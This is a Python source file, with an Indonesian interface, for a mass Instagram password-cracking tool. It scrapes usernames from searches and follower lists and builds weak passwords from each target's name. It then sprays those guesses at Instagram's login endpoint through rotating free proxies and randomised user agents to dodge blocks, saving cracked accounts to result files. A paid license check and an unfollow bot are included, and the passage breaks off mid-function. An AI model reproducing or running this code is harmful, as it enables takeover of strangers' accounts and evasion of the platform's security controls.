# coding:utf-8
#/usr/bin/python
try:
    import json
    import uuid
    import hmac
    import random
    import hashlib
    import urllib
    import stdiomask
    import urllib.request
    import calendar
except ImportError as e:
    exit(f'\n [\033[1;35m>\033[0m] module {e} belum terinstall')
    
###----------[ IMPORT MODULE AND INGREDIENT ]---------- ###
import rich
from rich.markdown import Markdown
import os, sys, subprocess, platform
import os
try:
    import requests
except ImportError:
    print('\n [×] Modul requests belum terinstall!...\n')
    os.system('pip install requests')
try:
    import concurrent.futures
except ImportError:
    print('\n [×] Modul Futures belum terinstall!...\n')
    os.system('pip install futures')
try:
    import bs4
except ImportError:
    print('\n [×] Modul Bs4 belum terinstall!...\n')
    os.system('pip install bs4')
try:
	import stdiomask
except ImportError:
	catet_mask = ('# • sedang menginstall modul stdiomask •')
	mask = rich.markdown.Markdown(catet_mask, style='green')
	rich.console.Console().print(mask)
	os.system('pip install stdiomask')
	
bff_2 = open(os.devnull, "w")
my_music = subprocess.call(["dpkg","-s","play-audio"],stdout=bff_2,stderr=subprocess.STDOUT)
bff_2.close()
if my_music !=0:
	catet_play = ('# • sedang menginstall play-audio •')
	play = rich.markdown.Markdown(catet_play, style='green')
	rich.console.Console().print(play)
	os.system('pkg install play-audio')
import requests,bs4,json,os,sys,random,datetime,time,re
try:
    import rich
except ImportError:
    os.system('pip install rich')
    time.sleep(1)
    try:
        import rich
    except ImportError:
        exit('Tidak Dapat Menginstall Module rich, Coba Install Manual (pip install rich)')
from rich.table import Table as me
from rich.console import Console as sol
from bs4 import BeautifulSoup as sop
from concurrent.futures import ThreadPoolExecutor as tred
from rich.console import Group as gp
from rich.panel import Panel as nel
from rich import print as cetak
from rich.markdown import Markdown as mark
from rich.columns import Columns as col
from time import sleep
from concurrent.futures import ThreadPoolExecutor
from datetime import datetime
from bs4 import BeautifulSoup as parser
import time
###----------[ IMPORT RICH AND INGREDIENT ]---------- ###
from rich.panel import Panel
from rich.tree import Tree
from rich import print as prints
from rich import print as printer
from rich.console import Console
from rich.console import Console as sol
from rich.table import Table
from rich.columns import Columns
from rich.progress import Progress,SpinnerColumn,BarColumn,TextColumn,TimeElapsedColumn
console = Console()
day=datetime.now().strftime("%d-%b-%Y")
nyMnD = 5
nyMxD = 10
current_GMT = time.gmtime(time.time())
insta_log='https://www.instagram.com/accounts/login/?force_classic_login=&'
url='https://www.instagram.com'
menudump=[]
def folder():
    try:os.mkdir('result')
    except:pass
    try:os.mkdir('data')
    except:pass
    
try:
    prox= requests.get('https://api.proxyscrape.com/v2/?request=displayproxies&protocol=socks4&timeout=100000&country=all&ssl=all&anonymity=all').text
    open('.prox.txt','w').write(prox)
except Exception as e:
    print('GAGAL')
    
prox=open('.prox.txt','r').read().splitlines()
CY='\033[96;1m'
H='\033[1;32m' #HIJAU
M='\033[1;31m' #MERAH
K='\033[1;33m' #KUNING
U='\033[1;35m' #UNGU
O='\033[38;2;255;127;0;1m' #ORANGE
C='\033[0m' #CLEAR
N = '\x1b[0m' # WARNA MATI
USN="Mozilla/5.0 (Linux; Android 6.0.1; SM-N910F Build/MMB29M; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/65.0.3325.109 Mobile Safari/537.36 Instagram 37.0.0.21.97 Android (23/6.0.1; 640dpi; 1440x2560; samsung; SM-N910F; trlte; qcom; pt_PT; 98288242)"
# USN="Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/45.0.2454.85 Safari/537.36"

internal,external,success,checkpoint,loop,following,lisensikuni,lisensiku=[],[],[],[],0,[],[],['sukses']
s=requests.Session()
# CLEAR
def clear():
    os.system('clear')
 
###----------[ GET TIME ]---------- ###
def waktu():
	now = datetime.now()
	hours = now.hour
	if 4 <= hours < 12:timenow = "Good Morning"
	elif 12 <= hours < 15:timenow = "Good Afternoon"
	elif 15 <= hours < 18:timenow = "Good Evening"
	else:timenow = "Good Night"
	return timenow


###----------[ LOGO ]---------- ###
def banner():
    os.system('clear')
    prints(Panel(f""" [deep_pink3]
 ___  ________  ________     
|\  \|\   __  \|\   ___ \    	[red]██████████████████████[/]   
\ \  \ \  \|\ /\ \  \_|\ \   	[red]██████████████████████[/]
 \ \  \ \   __  \ \  \ \\ \   	[white]██████████████████████[/]
  \ \  \ \  \|\  \ \  \_\\ \  	[white]██████████████████████[/]
   \ \__\ \_______\ \_______\	Made By [red]Indonesia [white]Coder[/]
                             """, title=f"{waktu()}" , subtitle="[on cyan] Version 2.0"))

try:
    # python 2
    urllib_quote_plus = urllib.quote
except:
    # python 3
    urllib_quote_plus = urllib.parse.quote_plus
 


def cekAPI(cookie):
    user=open('.username','r').read()
    try:
        c=s.get("https://i.instagram.com/api/v1/users/web_profile_info/?username=%s"%(user),cookies={'cookie':cookie},headers={"user-agent":USN,"x-ig-app-id":'936619743392459'})
        i=c.json()["data"]["user"]
        nama=i["full_name"]
        followers=i["edge_followed_by"]["count"]
        following=i["edge_follow"]["count"]
        external.append(f'{nama}|{followers}|{following}')
    except  (ValueError,KeyError):
        cetak(nel(f'\tAkun tumbal anda terkena checkpoint', style='red', title='😭😭😭'))
        time.sleep(3)
        os.remove('.kukis.log')
        os.remove('.username')
        exit()

    return external,user
#------------[ LOGIN-AKSES-KUKIS ]--------------#
def login_kamu():
        try:
            kuki=open('.kukis.log','r').read()
        except FileNotFoundError:
            banner()
            __anjing__ = '[white][[cyan]•>[white]] [green]Disarankan Login Menggunakan [yellow]Cookies!!\n[white][[cyan]•>[white]] [green]Sebab Kalau Lewat Manual Akun Gampang Terkena [yellow]Checkpoint!![white]'
            cetak(nel(__anjing__, style='bold green'))
            __kon__ = f'[white][[cyan]01[white]]. LOGIN ACCESS INSTAGRAM WITH COOKIES	([green] ON[white] )\n[[cyan]02[white]]. LOGIN ACCESS INSTAGRAM WITH USERNAME	( [green]ON[white] )\n[[cyan]03[white]]. CARA MENDAPATKAN COOKIES INSTAGRAM	( [green]ON[white] )'
            cetak(nel(__kon__, style='bold green'))
            loginpil=input(f"  ├──> Pilih : ")
            if loginpil=='1':
                wel = '[white][[cyan]•[white]] Masukkan Username And Cookies Untuk Login'
                cetak(nel(wel, style='bold white'))
                us=input(f'{C}Masukan Username : ')
                cok=input(f'{C}Masukan Cookies  : ')
                kuki=open('.kukis.log','w').write(cok)
                user=open('.username','w').write(us)
                print(f'  {C}[{B}•{C}]{H} Login SuccessFull.......!!{C}');time.sleep(2);os.system('python nano.py')
            elif loginpil == '2':
                login()
            elif loginpil == '3':
                os.system('xdg-open https://m.youtube.com');login_kamu()
            else:
                print(f'  ├──> Yang bener lah kontol ');exit()
        ex,user=cekAPI(kuki)
        cookie={'cookie':kuki}
        instagram(ex,user,cookie).menu()
#--------------[ LOGIN-AKSEZ-USERNAME ]------------#
def login():
    global external
    try:
        cetak(nel(f'\t{crot} Gunakan username dan paasword untuk login {crot}', style='bold white', title='🌟'))
        us=input(f'{C}  ├──> Masukkan username : ')
        pw=stdiomask.getpass(prompt=f'{C}  ├──> Masukkan password : ')
    except KeyboardInterrupt:
        print(f'  ├──> Yang bener lh kontoll {C}');exit()
    x=instagramAPI(us,pw).loginAPI()
    if x.get('status')=='success':
        open('.username','a').write(us)
        open('.kukis.log','a').write(x.get('cookie'))
        cookie={'cookie':x.get('cookie')}
        print(f'  ├──> {H}Login Successfully {C}');exit()
    elif x.get('status')=='checkpoint':
        print(f'  ├──> {K}Akun anda terkena checkpoint{C} ');time.sleep(2);login()
    else:
        print(f'  ├──> {K}Username atau password salah{C} ');time.sleep(2);login()


class instagram:
    def __init__(self,external,username,cookie):
        self.ext=external
        self.username=username
        self.cookie=cookie
        self.s=requests.Session()
    def logo(self):
        for i in external:
            try:
                nama=i.split('|')[0]
                followers=i.split('|')[1]
                following=i.split('|')[2]
            except:
                pass
            banner()
            welcome=f'''[{H}•{C}]Selamat Datang : {nama}
[{H}•{C}]Username       : {self.username}
[{H}•{C}]Followers      : {followers}
[{H}•{C}]Following      : {following}'''
            print(welcome)
            io='[01] Crack Dari Pencarian\n[02] Crack Dari Pengikut\n[03] Crack dari Mengikuti\n[04] Check Status Crack \n[05] Lihat Hasil Crack\n[06] Bot Auto Unfollow\n[R] Laporkan Bug\n[C] Changelog\n[E] Exit'
            oi = nel(io, style='green')
            cetak(nel(oi, title='MENU'))


    def BUG(self):
        bug=f'[•] Bantu saya mengembangkan script ini. apapun bugnya tolong laporkan kepada saya, semakin dikit bugnya semakin baik scriptnya.\n[•] Anda bisa melaporkan langsung ke wa admin +230 5297 0037\n[•]  𝐸𝑋𝑃𝐿𝑂𝐼𝐷-𝑁𝐼𝑇𝐶𝐻'
        bug1 = nel(bug, style='magenta')
        cetak(nel(bug1, title='REPORT BUG'))
        exit()

    def ChangeLog(self):
        io='[1] Fix bug login instagram\n[2] Ganti tampilan scripts\n[3] Fix bug lisensi invalid'
        oi = nel(io, style='magenta')
        cetak(nel(oi, title='Fitur yang di update'))

        io='[1] Bot unfollow instagram\n[2] Bot spam komen'
        oi = nel(io, style='cyan')
        cetak(nel(oi, title='Fitur tambahan'))

        io='[1] Untuk fitur brute force masih dalam perbaikan\n[2] Untuk fitur Bot unfollow masih dalam perbaikan\n[3] Untuk fitur bot komen masih dalam perbaikan'
        oi = nel(io, style='magenta')
        cetak(nel(oi, title='Fix Bug'))
        exit()

    def Exit(self):
        kel='# Apakah anda yakin ingin keluar ?'
        kel1=mark(kel,style='red')
        sol().print(kel1)
        x=input(f'\n{CY}[•] Jawaban [y/t] : {C}')
        if x in ('y','Y'):
            os.remove('.kukis.log')
            os.remove('.username')
            os.system('python run.py')
        elif x in ('t','T'):
            os.system('python run.py')
        else:
            self.Exit()

    def sixAPI(self,six_id):
        url = "https://www.instagram.com/web/search/topsearch/?context=blended&query="+six_id+"&rank_token=0.3953592318270893&count=1"
        x = requests.get(url)
        x_jason = x.json()
        uid = str( x_jason['users'][0].get("user").get("pk") )
        return uid

    def unfollowAPI(self,user_id,username_id,cookie):
        uuid=generateUUID(True)
        xx=self.s.get("https://www.instagram.com/",headers={"user-agent":USN}).content
        crf_token = re.findall('{"config":{"csrf_token":"(.*)","viewer"',str(xx))[0]
        s.headers.update({'Connection': 'close',
                       'Accept': '*/*',
                       'Content-type': 'application/x-www-form-urlencoded; charset=UTF-8',
                       'Cookie2': '$Version=1',
                       'Accept-Language': 'en-US',
                       'User-Agent': USN})

        data = json.dumps({'_uuid': uuid,
                           '_uid': username_id,
                           'user_id': user_id,
                           '_csrftoken': crf_token})

        self.payload = 'signed_body={}.{}&ig_sig_key_version=4'.format(
            self.generateUUID(False),
            urllib.request.quote(data))
        return s.post('https://i.instagram.com/api/v1/friendships/destroy/%s/'%(user_id),self.payload,cookies=cookie).text


    def searchAPI(self,cookie,nama):
        try:
            x=s.get('https://www.instagram.com/web/search/topsearch/?count=100000&context=blended&query=%s&rank_token=0.21663777590422106&include_reel=true'%(nama),cookies=cookie,headers={"user-agent":USN})
            x_jason=json.loads(x.text)
            for i in x_jason['users']:
                user=i['user']
                username=user['username']
                fullname=user['full_name']
                internal.append(f'{username}|{fullname}')
        except requests.exceptions.ConnectionError:
            exit(f'\n [{M}!{C}] Koneksi internet bermasalah')
        return internal

    def idAPI(self,cookie,id):
        if 'sukses' in lisensiku:
            try:
                m=s.get("https://i.instagram.com/api/v1/users/web_profile_info/?username=%s"%(id),cookies=cookie,headers={"user-agent":USN,"x-ig-app-id":'936619743392459'})
                m_jason=m.json()["data"]["user"]
                idx=m_jason["id"]
            except requests.exceptions.ConnectionError:
                exit(f"\n{M}┣[!] Koneksi internet bermasalah{C}")
            except Exception as e:
                exit(f"\n{M}┣[!] Username yang anda masukan tidak di temukan pastikan target bersifat publik{C}")
            return idx
        else:lisensi()

    def infoAPI(self,cookie,api,id):
        if 'sukses' in  lisensiku:
            try:
                idtar=f'# [•] TUNGGU SEDANG MENGUMPULKAN ID [•]'
                idtar1=mark(idtar,style='on green')
                sol().print(idtar1)
                x=s.get(api%(id),cookies=cookie,headers={"user-agent":USN})
                x_jason=json.loads(x.text)
                for i in x_jason['users']:
                    username = i["username"]
                    nama = i["full_name"]
                    internal.append(f'{username}|{nama}')
                    following.append(username)
                if 'pengikut' in menudump:
                    maxid=x_jason['next_max_id']
                    for z in range (9999):
                        x=s.get('https://i.instagram.com/api/v1/friendships/'+id+'/followers/?count=100&max_id='+maxid,cookies=cookie,headers={"user-agent":USN})
                        x_jason=json.loads(x.text)
                        try:
                            for i in x_jason['users']:
                                username = i["username"]
                                nama = i["full_name"]
                                internal.append(f'{username}|{nama}')
                                following.append(username)
                            try:
                                 maxid=x_jason['next_max_id']
                            except:
                                break
                        except:
                            if 'challenge' in x.text:
                                break
                            else:
                                continue
                else:pass
            except requests.exceptions.ConnectionError:
                exit(f'\n{M}┣[!] Koneksi internet bermasalah{C}')
            except Exception as e:
                print(f'\n{M}┣[!] Username yang anda masukan tidak di temukan{C}')
            return internal
        else:lisensi()

    def passwordAPI(self,xnx):
        idtar=f'# [•] TOTAL ID  : {len(internal)} [•]'
        idtar1=mark(idtar,style='green')
        sol().print(idtar1)
        pilpass='# Pilihan Kombinasi Password'
        pilpass1=mark(pilpass,style='green')
        sol().print(pilpass1)
        komb='[1] FirstName123 Firstname1234\n[2] FirtsName123 Firstname1234 Firstname12345 FullName\n[3] FirstName+123,FullName,Full Name\n[4] Password Manual'
        komb1 = nel(komb, style='blue')
        cetak(nel(komb1))
        c=input(f'{CY}[•] Masukan Pilihan :{C} ')
        if c=='1':
            self.generateAPI(xnx,c)
        elif c=='2':
            self.generateAPI(xnx,c)
        elif c=='3':
            self.generateAPI(xnx,c)
        elif c=='7':
            self.generateAPI(xnx,c)
        elif c=='4':
            ui='# PASSWORD MANUAL'
            uu=mark(ui,style='')
            sol().print(uu)
            print(f'{M} Contoh sayang,anjing,bangsat')
            print('')
            zx=input(f'{CY}[•] List password :{C} ')
            self.generateAPI(xnx,c,zx)
        else:
            self.passwordAPI(xnx)

    def generateAPI(self,user,o,zx=''):
        global prog,des
        prog = Progress(SpinnerColumn('clock'),TextColumn('{task.description}'),BarColumn(),TextColumn('{task.percentage:.0f}%'))
        des = prog.add_task('',total=len(internal))
        io=f'[•] Hasil OK disimpan ke: result/{day}.txt\n[•] Hasil CP disimpan ke: result/{day}.txt'
        oi = nel(io, style='green')
        cetak(nel(oi, title='CRACK READY'))
        ipku='# [•] If the IP address is spammed, turn on airplane mode for 10 seconds'
        ipku1=mark(ipku,style='red')
        sol().print(ipku1)
        with prog:
            with ThreadPoolExecutor(max_workers=15) as shinkai:
                for i in user:
                    try:
                        username=i.split("|")[0]
                        password=i.split("|")[1].lower()
                        for w in password.split(" "):
                            if len(w)<3:
                                continue
                            else:
                                w=w.lower()
                            if o=="1":
                                if len(w)==3 or len(w)==4 or len(w)==5:
                                    sandi=[w+'123',w+'1234']
                                else:
                                    sandi=[w]
                            elif o=="2":
                                if len(w)==3 or len(w)==4 or len(w)==5:
                                    sandi=[w+'123',w,w+'1234',w+'12345']
                                else:
                                    sandi=[w+'123',w,w+'1234',w+'12345']
                            elif o=="3":
                                if len(w)==3 or len(w)==4 or len(w)==5:
                                    sandi=[w+'123',w,password.lower()]
                                else:
                                    sandi=[w+'123',w,password.lower()]
                            elif o=="7":
                                if len(w)==3 or len(w)==4 or len(w)==5:
                                    sandi=[w+'123',w+'1234',w+'12345',w]
                                else:
                                    sandi=[w+'123',w+'1234',w+'12345',password.lower()]
                            elif o=="4":
                                if len(zx) > 3:
                                    sandi = zx.replace(" ", "").split(",")
                                else:
                                    break
                            shinkai.submit(self.crackAPI,username,sandi)
                    except:
                        pass
        print('\n')
        oi='# CRACK SELESAI'
        io=mark(oi,style='yellow')
        sol().print(io)
        exit()

    def APIinfo(self,user):
        try:
            x=s.get("https://i.instagram.com/api/v1/users/web_profile_info/?username=%s"%(user),headers={"user-agent":USN,"x-ig-app-id":'936619743392459'})
            x_jason=x.json()["data"]["user"]
            nama=x_jason["full_name"]
            pengikut=x_jason["edge_followed_by"]["count"]
            mengikut=x_jason["edge_follow"]["count"]
            postingan=x_jason["edge_owner_to_timeline_media"]["count"]
        except:
            pass

        return nama,pengikut,mengikut,postingan

    def crackAPI(self,user,pas):
        global loop,success,checkpoint
        prog.update(des,description=f"crack {str(loop)}/{len(internal)} OK : {H}{len(success)}{N} CP : {K}{len(checkpoint)}{N}")
        prog.advance(des)
        try:
            for pw in pas:
                ts = calendar.timegm(current_GMT)
                nip=random.choice(prox)
                proxs= {'http': 'socks4://'+nip}
                aa='Mozilla/5.0 (Linux; U; Android 2.3.4; en-us;'
                b=random.choice(['4','5','6','7','8','9','10','11','12'])
                c='T-Mobile myTouch 3G Slide Build/GRI40)'
                d=random.choice(['A','B', 'C', 'D', 'E', 'F', 'G', 'H', 'I', 'J', 'K', 'L', 'M', 'N', 'O', 'P', 'Q', 'R', 'S', 'T', 'U', 'V', 'W', 'X', 'Y', 'Z'])
                e=random.randrange(1, 999)
                f=random.choice(['A','B', 'C', 'D', 'E', 'F', 'G', 'H', 'I', 'J', 'K', 'L', 'M', 'N', 'O', 'P', 'Q', 'R', 'S', 'T', 'U', 'V', 'W', 'X', 'Y', 'Z'])
                g='AppleWebKit/533.1 (KHTML, like Gecko) Version/4.0 Mobile Safari/533.1'
                h=random.randrange(73,100)
                i='0'
                j=random.randrange(4200,4900)
                k=random.randrange(40,150)
                l='Mobile Safari/533.1'
                uaku=f'{aa} {b}; {c}{d}{e}{f}) {g}{h}.{i}.{j}.{k} {l}'
                token=s.get('https://www.instagram.com/accounts/login/?next=/accounts/logout/')
                headers = {
                    'Host': 'www.instagram.com',
                    'x-ig-www-claim': '0',
					'x-instagram-ajax': '1005633336-hot',
					'content-type': 'application/x-www-form-urlencoded',
					'accept': '*/*',
					'x-requested-with': 'XMLHttpRequest',
					'x-asbd-id': '198387',
					'user-agent': uaku,
					'x-csrftoken': token.cookies['csrftoken'],
					'x-ig-app-id': '1217981644879628',
					'origin': 'https://www.instagram.com',
					'sec-fetch-site': 'same-origin',
					'sec-fetch-mode': 'cors',
					'sec-fetch-dest': 'empty',
					'referer': 'https://www.instagram.com/accounts/login/?next=/accounts/logout/',
					'accept-encoding': 'gzip, deflate',
					'accept-language': 'id-ID,id;q=0.9,en-US;q=0.8,en;q=0.7'
                }
#					"enc_password": "#PWD_INSTAGRAM_BROWSER:0:{}:{}".format(random.randint(1000000000, 99999999999),pw),


                param={
                    "enc_password": f"#PWD_INSTAGRAM_BROWSER:0:{ts}:{pw}",
                    "username": user,
                    "optIntoOneTap": 'false',
                    "queryParams": "{}",
                    "stopDeletionNonce": "",
                    "trustedDeviceRecords": "{}"}
                x=s.post("https://www.instagram.com/accounts/login/ajax/",headers=headers,data=param,proxies=proxs)
                x_jason=json.loads(x.text)
                if "userId" in str(x_jason):
                    nama,pengikut,mengikut,postingan=self.APIinfo(user)
                    tree = Tree("")
                    tree.add(f"\r{H} {nama} | {user}{N}")
                    tree.add(f"\r{N}Pengikut : {H}{pengikut}{N}")
                    tree.add(f"\r{N}Mengikuti : {H}{mengikut}{N}")
                    tree.add(f"\r{N}Postingan : {H}{postingan}{N}")
                    tree.add(f"\r{N}User Agent : {H}{uaku}{N}")
                    prints(tree)
                    os.popen("play-audio data/dapet.mp3")
                    open(f"result/success-{day}.txt","a").write(f'{user}|{pw}|{pengikut}|{mengikut}\n')
                    success.append(user)
                    break
                elif 'checkpoint_url' in str(x_jason):
                    nama,pengikut,mengikut,postingan=self.APIinfo(user)
                    tree = Tree("")
                    tree.add(f"\r{M} {nama} | {user} {N} ")
                    tree.add(f"\r{N}Pengikut : {K}{pengikut}{N}")
                    tree.add(f"\r{N}Mengikuti : {K}{mengikut}{N}")
                    tree.add(f"\r{N}Postingan : {K}{postingan}{N}")
                    prints(tree)
                    open(f"result/checkpoint-{day}.txt","a").write(f'{user}|{pw}|{pengikut}|{mengikut}\n')
                    checkpoint.append(user)
                    break

                elif 'Please wait a few minutes' in str(x.text):
                    sys.stdout.write(f"\r┣[{U}!{C}] {U}IP KENA SPAM TUNGGU BEBERAPA MENIT{C}");sys.stdout.flush();sleep(0)
#					self.crackAPI(user,pas)
                elif 'ip_block' in str(x.text):
                    sys.stdout.write(f"\r┣[{U}!{C}] {U}IP DI BLOKIR ON OFF MODE PESAWAT{C}");sys.stdout.flush();sleep(0)
                    self.crackAPI(user,pas)
                elif 'spam' in str(x.text):
                    sys.stdout.write(f"\r┣[{U}!{C}] {U}TERDETEKSI SPAM ON OFF MODE PESAWAT{C}");sys.stdout.flush();sleep(0)
#					self.crackAPI(user,pas)

                else:
                    continue

            loop+=1
        except:
            self.crackAPI(user,pas)

    def checkAPI(self,user,pw):
        try:
            token=s.get("https://www.instagram.com/",headers={"user-agent":USN}).content
            crf_token=re.findall(r"\"csrf_token\"\:\"(.*?)\"", str(token))[0]
            s.headers.update({
                'authority': 'www.instagram.com',
                'x-ig-www-claim': 'hmac.AR3CH3q3WF_EHwNgjQj_uhjG15AF1ckFwoqU4QVfeHdOiBCT',
                'x-instagram-ajax': '82a581bb9399',
                'content-type': 'application/x-www-form-urlencoded',
                'accept': '*/*',
                'user-agent': USN,
                'x-requested-with': 'XMLHttpRequest',
                'x-csrftoken': crf_token,
                'x-ig-app-id': '936619743392459',
                'origin': 'https://www.instagram.com',
                'sec-fetch-site': 'same-origin',
                'sec-fetch-mode': 'cors',
                'sec-fetch-dest': 'empty',
                'referer': 'https://www.instagram.com/',
                'accept-language': 'en-GB,en-US;q=0.9,en;q=0.8'
            })

            param={
                "username": user,
                "enc_password": "#PWD_INSTAGRAM_BROWSER:0:{}:{}".format(random.randint(1000000000, 99999999999),pw),
                "optIntoOneTap": False,
                "queryParams": {},
                "stopDeletionNonce": "",
                "trustedDeviceRecords": {}
            }
            x=s.post("https://www.instagram.com/accounts/login/ajax/",data=param);sleep(1)
            x_jason=json.loads(x.text)
            if "userId" in x.text:
                nama,pengikut,mengikut,postingan=self.APIinfo(user)
                io=f'Nama     : {nama}\nUsername : {user}\nPassword : {pw}\nPengikut : {pengikut}\nMengikuti: {mengikut}\nPostingan: {postingan}'
                oi = nel(io, style='green')
                print('\n')
                cetak(nel(oi, title=' LIVE'))
                os.popen("play-audio data/dapet.mp3")

            elif 'checkpoint_url' in x.text:
                nama,pengikut,mengikut,postingan=self.APIinfo(user)
                io=f'Nama     : {nama}\nUsername : {user}\nPassword : {pw}\nPengikut : {pengikut}\nMengikuti: {mengikut}\nPostingan: {postingan}'
                oi = nel(io, style='yellow')
                print('\n')
                cetak(nel(oi, title=' CHECKPOINT'))

            elif 'Please wait a few minutes' in str(x.text):
                sys.stdout.write(f"\r {U}!{C}] {U}Please wait a few minutes second{C}");sys.stdout.flush();sleep(10)
                self.checkAPI(user,pw)
        except:
            self.checkAPI(user,pw)

    def menu(self):
        self.logo()
        c=input(f' {CY}[PILIH] :{C}  ')
        if c=='':
            self.menu()
        elif c in ('1','01'):
            mas='# Masukan jumlah target'
            mas1=mark(mas,style='green')
            sol().print(mas1)
            m=int(input(f'\n{CY}[•] Jumlah : {C}'));print('')
            mas='# Masukan nama ranfom untuk di searching'
            mas1=mark(mas,style='green')
            sol().print(mas1)
            for i in range(m):
                i+1
                nama=input(f'{CY}┣[>] Masukan nama ({H}{len(internal)}{C}): ')
                name=self.searchAPI(self.cookie,nama)
            self.passwordAPI(name)

        elif c in ('2','02'):
            pr='# PASTIKAN TARGET BERSIFAT PUBLIK'
            po=mark(pr,style='red')
            sol().print(po)
            mas=input('Apakah anda ingin crack masal? y/t >  ')
            if mas in ['y','Y']:
                masal(self)
            elif mas in ['t','T']:
                massal(self)
            elif mas in ['']:
                print('ISI JANGAN KOSONG KENTOD!')


        elif c in ('3','03'):
            pr='# PASTIKAN TARGET BERSIFAT PUBLIK'
            po=mark(pr,style='red')
            sol().print(po)
            mas=input('Apakah anda ingin crack masal? y/t >  ')
            if mas in ['y','Y']:
                mengi(self)
            elif mas in ['t','T']:
                meng(self)
            elif mas in ['']:
                print('ISI JANGAN KOSONG KENTOD!')


        elif c in ('4','04'):
            print('')
            for i in os.listdir('result'):
                print(f' [{U}>{C}] {i}')
            c=input(f'\n {CY}┣>>> Masukan nama file: {C}')
            g=open("result/%s"%(c)).read().splitlines()
            print(f'\n{CY}┣[+] Total Result MASTER_FU{H}{len(g)}{C}')
            print(f'\n{CY}┣[!] Proses mengecek status akun. silahkan tunggu sebentar{C}\n')
            for s in g:
                usr=s.split("|")[0]
                pwd=s.split("|")[1]
                self.checkAPI(usr,pwd)
            exit(f'\n\n{K}┣[#] proses check selesai...{C}')

        elif c in ('5','05'):
            print('')
            for i in os.listdir('result'):
                print(f' [{U}>{C}] {i}')
            c=input(f'\n {U}┣>>> Masukan nama file: {C}')
            g=open("result/%s"%(c)).read().splitlines()
            xx=c.split("-")
            xc=xx[0]
            print(f'\n{K}┣[>] Total result yang di temukan [{H}{len(g)}{C}]')
            for s in g:
                usr=s.split("|")[0]
                pwd=s.split("|")[1]
                fol=s.split("|")[2]
                ful=s.split("|")[3]
                if xc=="checkpoint":
                    print(f"""
 [{M}+{C}] {M}𝐌𝐀𝐌𝐏𝐔𝐒 𝐂𝐄𝐊𝐏𝐎𝐈𝐓{C}:
  {M}|{C}
  {M}├╴>{C} Username: {O}{usr}{C}
  {M}├╴>{C} Password: {O}{pwd}{C}
  {M}├╴>{C} Followers: {O}{fol}{C}
  {M}├╴>{C} Following: {O}{ful}{C}
                    """);sleep(0.05)
                else:
                    print(f"""
  {H}[>]{C}{H} IBD :  LIVE {C}
  {H}[>]{C}{H} Username : {H}{usr}{C}
  {H}[>]{C}{H} Password : {H}{pwd}{C}
  {H}[>]{C}{H} Pengikut : {H}{fol}{C}
  {H}[>]{C}{H} Mengikuti : {H}{ful}{C}
                    """);sleep(0.05)
        elif c in ('6','06'):
            global following
            six=0
            print(f'\n [{U}!{C}] Bot Unfollow-All Dijalankan\n')
            x=open('.kukis.log','r').read()
            x_id=re.findall('sessionid=(\d+)',x)[0]
            back=self.infoAPI(self.cookie,'https://i.instagram.com/api/v1/friendships/%s/following/?count=100000',x_id)
            for i in following:
                six+=1
                sleep(float( random.uniform(nyMnD*10,nyMxD*10) / 10 ))
                six_id=self.sixAPI(i)
                print(f' {str(six)}{U}}}{C} {i} {H}Unfollow-Berhasil{C}')
                self.unfollowAPI(six_id,'5452333948',self.cookie)
                #print(w)
            input(f'\n\n [{U}#{C}] Unfollow-all selesai...');self.menu()

        elif c in ('r','R'):
            self.BUG()
        elif c in ('c','C'):
            self.ChangeLog()
        elif c in ('e','E'):
            self.Exit()

        else:
            self.menu()
            
          
def tlisensi():
    banner()
    wel='# LICENSE IS NOT APPLICABLE OR WRONG'
    wel2 = mark(wel, style='red')
    sol().print(wel2)
    time.sleep(2)
    prints(Panel(f"""{N}[{H}01{H}]. I have apikey and want to enter it
[{N}02{N}]. I don't have Apikey and want to buy""",width=80,padding=(0,15),style=f"green"))
    api = input(f" {N}input choice : ")
    if api in["1","01"]:
        prints(Panel(f"""{H}enter the apikey you have, if not, please buy by selecting number 2""",width=80,style=f"green"))
        key = input(f" {N}input apikey : {H}")
        open('data/lisen.txt','w').write(key)
        lisensi()
    elif api in["2","02"]:
        os.system("xdg-open https://wa.me/6283115893229?text=assalamualaikum,+bang+me+want+buy+license")
        sleep(2);tlisensi()       
    else:    
        exit()




def lisensi():
    try:
        cek=open('data/lisen.txt').read()
        lisensikuni.append(cek)
    except:
        tlisensi()
    ses=requests.Session()
    res=ses.get('https://app.cryptolens.io/api/key/Activate?token=WyIyMDQ5MjE1NiIsImxRSVg5TFdaS2Z1UXFybUR1THZUMFByUHZjZEFhWmxMTzJNNWhucTIiXQ==&ProductId=15882&Key='+lisensikuni[0]).json()
    status=res['licenseKey']['key']
    if status ==cek:
        banner()
        wel='# LICENSE APPLICABLE '
        wel2 = mark(wel, style='green')
        sol().print(wel2)
        time.sleep(2)
        lisensiku.append("sukses")
        login_kamu()
    else:
        tlisensi()

def mengi(self):
            try:
                menudump.append('pengikut')
                mas='# Target harus bersifat publik jangan privat'
                mas1=mark(mas,style='red')
                sol().print(mas1)
                m=int(input(f'\n{H}[?{H}] Masukan jumlah target: {N}'))
            except:m=1
            for t in range(m):
                t +=1
                so=f'# TOTAL ID :{len(internal)}'
                pi=mark(so,style='green')
                sol().print(pi)
                nama=input(f' [{t}] Masukan Username : ')
                id=self.idAPI(self.cookie,nama)
                info=self.infoAPI(self.cookie,'https://i.instagram.com/api/v1/friendships/%s/following/?count=100000',id)
            self.passwordAPI(info)

def meng(self):
    mas='# Target harus bersifat publik jangan privat'
    mas1=mark(mas,style='red')
    sol().print(mas1)
    m=input(f'{CY}[•] Username target : {C}')

    id=self.idAPI(self.cookie,m)
    info=self.infoAPI(self.cookie,'https://i.instagram.com/api/v1/friendships/%s/following/?count=100000',id)
    self.passwordAPI(info)

def masal(self):
            try:
                menudump.append('pengikut')
                mas='# Target harus bersifat publik jangan privat'
                mas1=mark(mas,style='red')
                sol().print(mas1)
                m=int(input(f'\n{H}[?{H}] Masukan jumlah target: {N}'))
            except:m=1
            for t in range(m):
                t +=1
                so=f'# TOTAL ID :{len(internal)}'
                pi=mark(so,style='green')
                sol().print(pi)
                nama=input(f' [{t}] Masukan Username : ')
                id=self.idAPI(self.cookie,nama)
                info=self.infoAPI(self.cookie,'https://i.instagram.com/api/v1/friendships/%s/followers/?count=100000',id)
            self.passwordAPI(info)



def massal(self):
            menudump.append('pengikut')
            mas='# Target harus bersifat publik jangan privat'
            mas1=mark(mas,style='red')
            sol().print(mas1)
            m=input(f'{CY}[•] Username target : {C}')

            id=self.idAPI(self.cookie,m)
